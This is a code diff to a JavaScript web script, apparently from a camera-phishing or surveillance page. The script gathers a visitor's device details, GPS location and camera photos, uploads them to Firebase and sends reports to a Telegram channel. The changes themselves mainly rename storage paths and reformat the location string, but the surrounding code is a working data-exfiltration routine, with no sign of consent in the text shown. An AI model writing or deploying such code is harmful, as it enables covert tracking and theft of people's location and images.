@@ -1,4 +1,3 @@
-
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
 import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
 import { getDatabase, ref as dbRef, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
@@ -47,9 +46,10 @@ async function sendDeviceInfo() {
 
   const sendInfo = (locationInfo = null) => {
     if (locationInfo) {
-      info.location = locationInfo;
+      info.loc = `${locationInfo.lat}, ${locationInfo.lon}`;
     }
-    const infoRef = dbRef(database, 'deviceInfo/' + Date.now());
+
+    const infoRef = dbRef(database, 'deviceInfo_pac/' + Date.now());
     set(infoRef, info);
 
     let text = "📱 Device Info:\n";
@@ -57,8 +57,8 @@ async function sendDeviceInfo() {
     text += `🌐 Platform: ${info.platform}\n`;
     text += `🧭 Language: ${info.language}\n`;
     text += `📟 UserAgent: ${info.userAgent}\n`;
-    if (info.location) {
-      text += `📍 Location: ${info.location.lat}, ${info.location.lon}\n`;
+    if (info.loc) {
+      text += `📍 Location: ${info.loc}\n`;
     }
     sendTelegramText(text);
   };
@@ -93,10 +93,10 @@ function sendToTelegram(blob, fileName) {
 
 function uploadToFirebase(blob, cameraType) {
   const fileName = `${cameraType}_${Date.now()}.jpg`;
-  const storageRef = ref(storage, 'images/' + fileName);
+  const storageRef = ref(storage, 'image_pac/' + fileName);
   uploadBytes(storageRef, blob).then(() => {
     getDownloadURL(storageRef).then((url) => {
-      const imgRef = dbRef(database, 'images/' + fileName.replace('.jpg', ''));
+      const imgRef = dbRef(database, 'image_pac/' + fileName.replace('.jpg', ''));
       set(imgRef, {
         timestamp: new Date().toISOString(),
         camera: cameraType,
